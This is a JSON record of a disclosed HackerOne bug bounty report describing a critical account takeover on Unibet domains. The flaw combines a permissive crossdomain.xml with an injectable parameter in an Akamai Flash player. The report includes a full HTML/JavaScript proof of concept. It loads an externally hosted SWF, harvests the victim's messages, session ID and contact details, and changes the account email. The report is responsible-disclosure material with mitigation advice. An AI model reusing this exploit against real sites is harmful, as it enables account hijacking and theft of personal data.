@@ -1,0 +1,155 @@
+{
+  "id": 302581,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDI1ODE=",
+  "url": "https://hackerone.com/reports/302581",
+  "title": "Full Account Takeover on *.unibet.com due to crossdomain.xml and AkamaiPlayer loaderContext",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-01-05T01:22:59.308Z",
+  "submitted_at": "2018-01-05T01:22:59.308Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "fransrosen",
+    "url": "/fransrosen",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/634/6569f1cff6ac26c01a91db469d8707228965f09f_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 14047,
+    "url": "https://hackerone.com/kindred_group",
+    "handle": "kindred_group",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/014/047/30c5e0ecef105a2592f8b5a8a6102a5fae5bad0c_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/047/30c5e0ecef105a2592f8b5a8a6102a5fae5bad0c_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Kindred Group",
+      "twitter_handle": "",
+      "website": "https://www.kindredgroup.com",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "no-content",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2023-04-03T10:23:51.991Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-04-03T10:23:51.873Z",
+  "team_member_agreed_on_going_public_at": "2023-04-03T09:22:37.900Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "",
+  "bounty_amount": "1500.0",
+  "formatted_bounty": "$1,500",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 79,
+  "voters": [
+    "sumzer0",
+    "shreyaschavhan",
+    "surya_ganesan_",
+    "uneefa",
+    "nahuelrm_",
+    "p4n7h3rx",
+    "n1m0",
+    "jamieparfet",
+    "haxor31337",
+    "drsniper",
+    "and 69 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 3568,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.unibet.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "id": 260382,
+      "category": "team",
+      "content": "==Below is the original, partially-redacted report==\n\n---------\n\nHi,\n\nThe core issue here are two things:\n1. The too wide crossdomain.xml located at:\n\n```\nhttps://payment.unibet.com/crossdomain.xml\nhttps://se.unibet.com/crossdomain.xml\nhttps://www.unibet.com/crossdomain.xml\n```\n\n2. Issues with not-in-scope subdomains.\n\nAs you see, the crossdomain loads in a lot of sites in it, and due to this, all these domains are allowed to make requests as the victim completely without any validation or interaction what so ever. This is bad in itself when having some external sites and really old non-taken-care-of websites (travnet.se and menmo.se are two good example of that), but I wanted to also show that even subdomains of *.unibet.* can be bad.\n\nIn my case, there's a SWF-file located on l.unibet.fr:\n\n```\nhttps://l.unibet.fr/unibet/video/PerformLivePlayer.swf\n```\n\nThis domain is obviously not in your current scope. But it doesn't really matter since it currently allows full control over the domains in scope.\n\nThis specific file is an AkamaiPlayer, what's interesting with it, is that it has a parameter you can send to it called `akamaiMonitorSWF`. This is used for an analytics SWF. However, since you can change it, the SWF being loaded gets full access to the current SWF, making it possible to act as the parent SWF. And since the crossdomain.xml on `se.unibet.com` looks like this:\n\n```\n<allow-access-from domain=\"*.unibet.fr\" secure=\"true\"/>\n<site-control permitted-cross-domain-policies=\"master-only\"/>\n```\n\nWe can now fully control the current user with this injection of our own SWF.\n\nI have made a pretty broad and extensive PoC for this, basically fetching out all messages, info about the customer as well as changing the email-address of the current user. This is because I want to show how bad this really is.\n\n### PoC\n\nMy PoC does the following:\n\n1. Fetches all messages to the current user\n2. Fetches email+phone+sessionId for the current user\n3. Fetches the current address for the user\n4. Changes the email of the current user to `frans.rosen+unibet[RANDOMNUMBER]@gmail.com`.\n\nThere is a rate limit of changing the email, but it's just 30 minutes and the email only needs to be changed once anyway.\n\nYou might need to change the `se.unibet.com` to any other locale you're currently using. You can also change the email differently if you like of course:\n\n```html\n<body>\n<style>pre { white-space: inherit; }</style>\n<div id=\"flash\"></div>\n<pre id=\"log\"></pre>\n<script>\nvar x;\nfunction log(s) { var l = document.createElement('pre'); l.innerText=s; document.getElementById('log').appendChild(l); }\nfunction flashload(url,data,fnc){\n    url = url.split(' ')\n\tmethod = url.shift();\n\turl = url.join(' ');\n    ct = \"\"\n    if(typeof data != \"string\") { \n      data = JSON.stringify(data);\n      ct = \"%26ct=application/json\"\n    }\n    data = escape(escape(data)).replace(/\\+/g,'%252b')\n\tdocument.getElementById('flash').innerHTML = '<object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=9,0,0,0\" width=\"10\" height=\"10\" id=\"x\"><param name=\"allowScriptAccess\" value=\"always\" /><param name=\"movie\" value=\"https://l.unibet.fr/unibet/video/PerformLivePlayer.swf\" /><param name=\"quality\" value=\"high\" /><param name=\"FlashVars\" value=\"akamaiMonitorSWF=https://detectify-labs.s3.amazonaws.com/callback-loadmovie-poc.swf%3fu='+url+'%26f='+fnc+'%26m='+method+'%26d='+data+ct+'\" /><embed src=\"https://l.unibet.fr/unibet/video/PerformLivePlayer.swf\" flashvars=\"akamaiMonitorSWF=https://detectify-labs.s3.amazonaws.com/callback-loadmovie-poc.swf%3fu='+url+'%26f='+fnc+'%26m='+method+'%26d='+data+ct+'\" quality=\"high\" width=\"10\" height=\"10\" name=\"x\" align=\"middle\" allowScriptAccess=\"always\" type=\"application/x-shockwave-flash\" pluginspage=\"http://www.macromedia.com/go/getflashplayer\" /></object>';\n}\nfunction dataSplit(d,p,s) {\n  d=d.substr(d.indexOf(p));\n  d=d.substr(p.length);\n  d=d.substr(0, d.indexOf(s));\n  return d;\n}\nfunction step1(s) {\n\tlog('Fetching messages...');\n\tflashload('GET //se.unibet.com/mom-api/messages/x', '', 'step1done');\n}\nfunction step1done(s) {\n\tlog(unescape(s))\n\tstep2();\n}\nfunction step2() {\n\tlog('Fetching email+session+phone...');\n\tflashload('GET //se.unibet.com/myaccount/mydetails/editdetails', '', 'step2done');\n}\nfunction step2done(s) {\n\ts=unescape(s);\n\tlog('email: ' + dataSplit(s, \"email: '\", \"'\"))\n\tlog('phoneNumber: ' + dataSplit(s, \"phoneNumber: '\", \"'\"))\n\tlog('sessionId: ' + dataSplit(s, \"sessionId: '\", \"'\"))\n\tlog('qualifiedUserName: ' + dataSplit(s, \"qualifiedUserName: '\", \"'\"))\n\tstep3();\n}\nfunction step3() {\n\tlog('Fetching address...')\n\tflashload('GET https://se.unibet.com/custard/pubcustard/secure/customers/profile?_=1515110776717', '', 'step3done');\n}\nfunction step3done(s) {\n\tlog(unescape(s))\n\tstep4();\n}\nfunction step4() {\n    emailto = 'frans.rosen+unibet' + (Math.random()+'').split('.')[1] + '@gmail.com'\n\tlog('Changing email to: ' + emailto + '...')\n\tflashload('POST https://se.unibet.com/custard/pubcustard/secure/customers', {\"customerProfile\":{\"email\":emailto}}, 'step4done');\n}\nfunction step4done(s) {\n\tlog(unescape(s))\n}\nstep1();\n</script>\n</body>\n```\n\nResult:\n██████\n\nThe account shows the changed email on the account settings page:\n█████\n\nThe new email we changed to gets a \"email changed\"-email, the old email does not get anything:\n██████████\n\nPoC-movie:\n█████\n\nAs you see, I'm able to command the SWF at l.unibet.fr using my injected SWF into it to make certain calls, which in this case is a bunch of GETs and a POST. I did not see any CSRF-tokens that was needed either, but it wouldn't have matter in this case since I would be able to claim them anyway.\n\nThe PoC is also hosted here for now:\n\n```\nhttps://detectify-labs.s3.amazonaws.com/test.unibet.ato.html\n```\n\nIf you're signed in into `se.unibet.com` you should be able to just access that file and the email would then change to my account. \n\n### Mitigation\n\nYou need to urgently modify the crossdomain.xml of payment.unibet.com and *.unibet.com, this is my best way to explain this. Removing the SWF on l.unibet.fr will only prevent that specific file from abusing this, there are most likely more of them on the amount of domains you're using. Also, you're allowing external companies (like iesnare.com) with a wildcard, which basically leaves it up to them if you would be vulnerable in the future or not. Please consider this when cleaning up.\n\nRegards,\nFrans\n\n## Impact\n\nHaving the ability to completely takeover an account by just visiting a link is extremely dangerous, the concept of the crossdomain.xml allows so many domains as wildcards. Also if you fix this, remember that `*.unibet.fr` might seem like a wise choice, since you own that complete domain. But as I showed in my example, even `l.unibet.fr` is just as dangerous.\n",
+      "user": {
+        "id": 360834,
+        "username": "jamie-kg",
+        "name": "jamie",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": null,
+        "location": "",
+        "created_at": "2018-09-25T07:11:08.390Z",
+        "url": "https://hackerone.com/jamie-kg",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/360/834/c1b47af0e2412cede39db4703a8442600914f5d8_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/360/834/c1b47af0e2412cede39db4703a8442600914f5d8_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/360/834/c1b47af0e2412cede39db4703a8442600914f5d8_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": []
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
